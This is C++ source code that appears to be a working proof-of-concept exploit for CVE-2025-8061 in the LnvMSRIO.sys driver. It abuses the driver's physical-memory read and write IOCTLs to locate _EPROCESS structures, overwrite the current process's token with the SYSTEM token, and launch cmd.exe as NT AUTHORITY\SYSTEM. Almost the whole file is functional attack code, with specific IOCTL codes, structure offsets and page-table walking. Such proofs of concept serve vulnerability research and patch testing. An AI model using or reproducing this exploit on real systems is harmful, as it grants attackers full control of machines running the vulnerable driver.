/*
 * 02_token_steal.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — Token Stealing
 *
 * Goal: copy the SYSTEM process token into the current process token
 *       → spawn cmd.exe that runs as NT AUTHORITY\SYSTEM.
 *
 * Technique (DKOM — data-only, no code execution)
 * ────────────────────────────────────────────────
 * 1. Scan physical RAM for _EPROCESS structures.
 *    Signature: UniqueProcessId == 4 AND ImageFileName == "System"
 *    → found System _EPROCESS PA
 *
 * 2. Scan for current process _EPROCESS.
 *    Signature: UniqueProcessId == GetCurrentProcessId()
 *    AND ImageFileName matches our own image name.
 *
 * 3. Read Token (_EX_FAST_REF, 8 bytes) from System _EPROCESS.
 *
 * 4. Write that Token value into current process _EPROCESS.Token.
 *    → current process now holds SYSTEM credentials.
 *
 * 5. CreateProcess("cmd.exe") inherits the SYSTEM token.
 *
 * _EPROCESS field offsets (x64, all builds ≥ 19041)
 * ──────────────────────────────────────────────────
 * Field              Offset    Notes
 * UniqueProcessId    +0x440    ULONG_PTR
 * ActiveProcessLinks +0x448    LIST_ENTRY (not used here — we scan phys)
 * Token              +0x4B8    _EX_FAST_REF (8 bytes)
 *                              bits[63:4] = pointer to TOKEN object
 *                              bits[ 3:0] = RefCount (fine to copy as-is)
 * ImageFileName      +0x5A8    char[15], null-padded
 *
 * IOCTL layouts
 * ─────────────
 *   Phys read   0x9c406104
 *     IN  → { UINT64 PA; DWORD AccessSize; DWORD Count }
 *     OUT ← AccessSize × Count bytes
 *
 *   Phys write  0x9c40a108
 *     IN  → { UINT64 PA; DWORD OperationType=1; DWORD AccessSize; BYTE Data[AccessSize] }
 *     OUT ← (ignored)
 *     AccessSize: 1, 2, or 8
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:02_token_steal.exe 02_token_steal.cpp
 *      /link kernel32.lib advapi32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME       L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ   0x9c406104u
#define IOCTL_PHYS_WRITE  0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    printf("[+] Device opened  handle=%p\n", g_dev);
    return true;
}

// ─── Physical read ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn  { UINT64 PA; DWORD AccessSize; DWORD Count; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

// ─── Physical write ───────────────────────────────────────────────────────────
//
// The write IOCTL input layout:
//   UINT64  PA
//   DWORD   OperationType  = 1
//   DWORD   AccessSize     = bytes to write (1 / 2 / 8)
//   BYTE[]  Data           = AccessSize bytes of data  (immediately follows)
//
// Total input size = 8 + 4 + 4 + AccessSize

#pragma pack(push, 1)
struct PhysWriteIn1  { UINT64 PA; DWORD OT; DWORD AS; BYTE  Data; };  // 1 byte
struct PhysWriteIn8  { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; }; // 8 bytes
#pragma pack(pop)

static bool PhysWriteU8(uint64_t pa, uint8_t val)
{
    PhysWriteIn1 in = { pa, 1, 1, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

static bool PhysWriteU64(uint64_t pa, uint64_t val)
{
    PhysWriteIn8 in = { pa, 1, 8, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── Physical memory range enumeration (VMware-safe) ─────────────────────────

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return 0;
    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }
    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb) != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf); RegCloseKey(hKey); return 0;
    }
    RegCloseKey(hKey);
    int n = 0; DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8; off += 4;
            if (off + 4 > cb) break;
            DWORD dc = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dc && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) { out[n].base = (uint64_t)st.QuadPart; out[n].size = len; n++; }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

// ─── _EPROCESS offsets ───────────────────────────────────────────────────────
//
// These are stable across Windows 10 19041 → Windows 11 26100+.
// If Microsoft changes them, run:
//   dt nt!_EPROCESS UniqueProcessId ActiveProcessLinks Token ImageFileName
// in WinDbg to get new values.

struct EprocOffsets {
    DWORD UniqueProcessId;   // +0x440
    DWORD Token;             // +0x4B8  (_EX_FAST_REF, 8 bytes)
    DWORD ImageFileName;     // +0x5A8  (char[15])
};

static EprocOffsets g_off = { 0x440, 0x4B8, 0x5A8 };

// ─── EPROCESS scan ───────────────────────────────────────────────────────────
//
// Strategy: scan physical RAM page-by-page.
// For each 8-byte aligned slot, test:
//   slot + UniqueProcessId == targetPid
//   slot + ImageFileName   starts with targetName
//
// Returns physical address of the _EPROCESS base on success, 0 on failure.
// A 1 MB read window is used per call to amortize IOCTL overhead.

#define SCAN_CHUNK  (1u << 20)   // 1 MB per IOCTL call
#define SCAN_STEP   8u           // scan every 8 bytes (EPROCESS is 8-byte aligned)

static uint64_t FindEprocess(DWORD targetPid, const char *targetName)
{
    PhRange ranges[32];
    int n_ranges = GetPhysRanges(ranges, 32);
    if (n_ranges == 0) {
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        ranges[0].base = 0x100000;
        ranges[0].size = 0x07F00000;  // [1 MB, 128 MB) — System EPROCESS always here
        n_ranges = 1;
    }

    // Minimum trailing bytes needed past the slot start
    DWORD minTrail = g_off.ImageFileName + 8;

    auto *chunk = (uint8_t *)VirtualAlloc(nullptr, SCAN_CHUNK,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!chunk) return 0;

    uint64_t result = 0;

    for (int ri = 0; ri < n_ranges && !result; ri++) {
        uint64_t pa_start = (ranges[ri].base + 0xFFFFF) & ~(uint64_t)0xFFFFF;
        uint64_t pa_end   = ranges[ri].base + ranges[ri].size;
        if (pa_start < 0x100000) pa_start = 0x100000;

        for (uint64_t pa = pa_start; pa < pa_end && !result; pa += SCAN_CHUNK) {
        DWORD readLen = (pa + SCAN_CHUNK <= pa_end)
                        ? SCAN_CHUNK
                        : (DWORD)(pa_end - pa);

        // Read in 4 KB pages — skip unreadable pages (MMIO holes) gracefully.
        // A single 1 MB PhysRead call fails because the driver's page limit is 4 KB.
        bool any_ok = false;
        for (DWORD pg = 0; pg < readLen; pg += 0x1000) {
            DWORD pl = (readLen - pg < 0x1000u) ? (readLen - pg) : 0x1000u;
            if (PhysRead(pa + pg, chunk + pg, pl)) any_ok = true;
            else memset(chunk + pg, 0, pl);
        }
        if (!any_ok) continue;

        for (DWORD off = 0; off + minTrail <= readLen; off += SCAN_STEP) {

            // Check UniqueProcessId
            ULONG_PTR pid_val = *(ULONG_PTR *)(chunk + off + g_off.UniqueProcessId);
            if ((DWORD)pid_val != targetPid) continue;
            if (pid_val >> 32) continue;  // high 32 bits must be zero for PID

            // Check ImageFileName prefix
            const char *fname = (const char *)(chunk + off + g_off.ImageFileName);
            size_t nameLen = strlen(targetName);
            if (_strnicmp(fname, targetName, nameLen) != 0) continue;

            result = pa + off;
            printf("    [scan] %s  PID=%-6lu  EPROCESS PA=0x%016llX\n",
                   fname, (unsigned long)targetPid, result);
            break;
        }
        }  // inner for (pa)
    }  // outer for (ri)

    VirtualFree(chunk, 0, MEM_RELEASE);
    return result;
}

// ─── 4-level page walk + APL chain walk ─────────────────────────────────────

// Convert kernel VA → physical address using System process CR3.
static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    auto rd8 = [](uint64_t pa) -> uint64_t {
        uint64_t v = 0; PhysReadU64(pa, &v); return v;
    };
    uint64_t pml4e = rd8((cr3 & ~0xFFFULL) + ((va >> 39) & 0x1FF) * 8);
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = rd8((pml4e & ~0xFFFULL) + ((va >> 30) & 0x1FF) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7))                                   // 1 GB large page
        return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFF);
    uint64_t pde = rd8((pdpte & ~0xFFFULL) + ((va >> 21) & 0x1FF) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7))                                     // 2 MB large page
        return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFF);
    uint64_t pte = rd8((pde & ~0xFFFULL) + ((va >> 12) & 0x1FF) * 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | (va & 0xFFF);
}

static bool KernelReadU64(uint64_t cr3, uint64_t va, uint64_t *out)
{
    uint64_t pa = VaToPa(cr3, va);
    return pa && PhysReadU64(pa, out);
}

// Walk ActiveProcessLinks (APL) to find target_pid's EPROCESS kernel VA.
// Uses ~4 PhysRead calls per process (page walk), avoids full physical scan.
static uint64_t FindEprocessVA(uint64_t cr3, uint64_t system_eproc_pa, DWORD target_pid)
{
    uint64_t apl_flink = 0;
    if (!PhysReadU64(system_eproc_pa + 0x448, &apl_flink) || !apl_flink)
        return 0;

    uint64_t cur = apl_flink;
    for (int i = 0; i < 1024; i++) {
        uint64_t eproc_va = cur - 0x448;
        uint64_t pid = 0;
        if (!KernelReadU64(cr3, eproc_va + 0x440, &pid)) break;
        if ((DWORD)pid == target_pid)
            return eproc_va;
        uint64_t next = 0;
        if (!KernelReadU64(cr3, cur, &next)) break;
        if (next == apl_flink) break;  // full circle back to start
        cur = next;
    }
    return 0;
}

// ─── Privilege helpers ───────────────────────────────────────────────────────

static void EnablePrivilege(const wchar_t *name)
{
    HANDLE hTok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return;
    LUID luid{};
    LookupPrivilegeValueW(nullptr, name, &luid);
    TOKEN_PRIVILEGES tp = { 1, {{ luid, SE_PRIVILEGE_ENABLED }} };
    AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(hTok);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 02 - Token Stealing ===\n\n");

    if (!OpenDevice()) return 1;

    // SeDebugPrivilege not strictly needed here (physical scan bypasses it),
    // but useful for the final CreateProcess call.
    EnablePrivilege(L"SeDebugPrivilege");

    DWORD myPid = GetCurrentProcessId();
    char  myName[MAX_PATH];
    GetModuleFileNameA(nullptr, myName, sizeof(myName));
    // Strip path, keep just the exe name
    const char *myBaseName = strrchr(myName, '\\');
    myBaseName = myBaseName ? myBaseName + 1 : myName;
    // Strip .exe extension for ImageFileName comparison (it's stored without extension
    // on some builds, and with on others — we compare just the base stem)
    char myStem[16] = {};
    strncpy_s(myStem, sizeof(myStem), myBaseName, 15);
    if (char *dot = strrchr(myStem, '.')) *dot = '\0';

    printf("[*] Current process: PID=%lu  name=\"%s\"\n\n", myPid, myBaseName);

    // ── Step 1: find System _EPROCESS ────────────────────────────────────────
    printf("[*] Scanning for System _EPROCESS (PID=4)...\n");
    uint64_t system_eproc_pa = FindEprocess(4, "System");
    if (!system_eproc_pa) {
        printf("[-] System _EPROCESS not found\n");
        CloseHandle(g_dev); return 1;
    }

    // Read System's Token (_EX_FAST_REF)
    uint64_t system_token = 0;
    if (!PhysReadU64(system_eproc_pa + g_off.Token, &system_token) || !system_token) {
        printf("[-] Failed to read System token\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] System _EPROCESS @ PA  0x%016llX\n", system_eproc_pa);
    printf("[+] System Token           0x%016llX\n\n", system_token);

    // ── Step 2: find self EPROCESS via APL walk (no second physical scan) ───────
    // Physical scan for self would require ~800,000 MmMapIoSpace calls → BSOD.
    // APL walk uses ~4 calls per process entry → safe.
    uint64_t cr3 = 0;
    PhysReadU64(system_eproc_pa + 0x028, &cr3);   // DirectoryTableBase
    if (!cr3 || (cr3 & 0xFFF)) {
        printf("[-] Failed to read System CR3 (got 0x%llX)\n", cr3);
        CloseHandle(g_dev); return 1;
    }
    printf("[+] System CR3             0x%016llX\n", cr3);

    printf("[*] Walking APL chain for self (PID=%lu, \"%s\")...\n", myPid, myStem);
    uint64_t self_eproc_va = FindEprocessVA(cr3, system_eproc_pa, myPid);
    if (!self_eproc_va) {
        printf("[-] Self EPROCESS not found in APL chain\n");
        CloseHandle(g_dev); return 1;
    }

    // VaToPa per-field to handle EPROCESS straddling page boundaries
    uint64_t self_eproc_pa  = VaToPa(cr3, self_eproc_va);
    uint64_t self_token_pa  = VaToPa(cr3, self_eproc_va + g_off.Token);
    if (!self_eproc_pa || !self_token_pa) {
        printf("[-] VaToPa on self EPROCESS failed\n");
        CloseHandle(g_dev); return 1;
    }

    uint64_t orig_token = 0;
    PhysReadU64(self_token_pa, &orig_token);
    printf("[+] Self _EPROCESS VA      0x%016llX\n", self_eproc_va);
    printf("[+] Self _EPROCESS PA      0x%016llX\n", self_eproc_pa);
    printf("[+] Self Token (before)    0x%016llX\n\n", orig_token);

    // ── Step 3: overwrite Token ───────────────────────────────────────────────
    //
    // _EX_FAST_REF layout:
    //   bits [63:4] = Object pointer (16-byte aligned)
    //   bits [3:0]  = Reference count (kernel manages this)
    //
    // Safest approach: copy System's EX_FAST_REF value directly.
    // The kernel will not crash from a stolen token — it only does a pointer
    // dereference when checking the token, and the System token is valid.
    //
    // If you want to zero out the ref count bits (purist approach):
    //   uint64_t clean_token = system_token & ~0xFULL;
    // In practice, copying the whole value works fine.

    printf("[*] Writing System token to self _EPROCESS.Token...\n");
    if (!PhysWriteU64(self_token_pa, system_token)) {
        printf("[-] PhysWriteU64 failed: %lu\n", GetLastError());
        CloseHandle(g_dev); return 1;
    }

    // Readback to verify
    uint64_t token_after = 0;
    PhysReadU64(self_token_pa, &token_after);
    printf("[+] Self Token (after)     0x%016llX  %s\n\n",
           token_after,
           (token_after == system_token) ? "[MATCH — token stolen!]" : "[MISMATCH]");

    if (token_after != system_token) {
        printf("[-] Token write did not stick — driver may be buffering writes\n");
        CloseHandle(g_dev); return 1;
    }

    // ── Step 4: spawn SYSTEM cmd.exe ─────────────────────────────────────────
    //
    // CreateProcess inherits the caller's token (which is now SYSTEM).
    // The new process starts with full NT AUTHORITY\SYSTEM privileges.

    printf("[*] Spawning cmd.exe as SYSTEM...\n");

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};

    BOOL ok = CreateProcessA(
        nullptr,
        (LPSTR)"cmd.exe",
        nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE,
        nullptr, nullptr,
        &si, &pi);

    if (!ok) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        // Restore original token before exit
        PhysWriteU64(self_token_pa, orig_token);
        CloseHandle(g_dev); return 1;
    }

    printf("[+] cmd.exe started  PID=%lu\n", pi.dwProcessId);
    printf("[+] Run   whoami   in the new window to confirm NT AUTHORITY\\SYSTEM\n\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(g_dev);

    // Note: we do NOT restore the token here — restoring it would downgrade our
    // privileges before the child process is fully initialised.
    // The token will be cleaned up when this process exits.

    printf("[+] Done.\n");
    return 0;
}
